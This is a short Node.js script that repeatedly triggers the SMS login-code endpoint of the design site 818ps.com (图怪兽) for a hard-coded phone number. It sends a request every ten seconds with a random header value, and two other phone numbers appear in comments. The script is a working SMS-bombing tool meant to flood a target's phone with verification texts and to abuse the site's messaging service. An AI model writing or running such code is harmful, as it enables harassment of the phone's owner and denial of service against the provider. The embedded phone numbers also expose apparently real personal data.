const https = require('https')

// ####################
// 图怪兽
// ####################

async function pipe1(phone) {
    let para = ''
    for (let i = 0; i < 168; i++) {
        para += Math.floor(Math.random()*10)
    }
    // let phone = '13008146006'
    // let phone = '17761204104'
    https.get(`https://818ps.com/site-api/send-tel-login-code?num=${phone}&codeImg=undefined`, {
        method: 'GET',
        headers: {
            para
        }
    })
}

setInterval(() => {
    pipe1('17761204104')
}, 10000);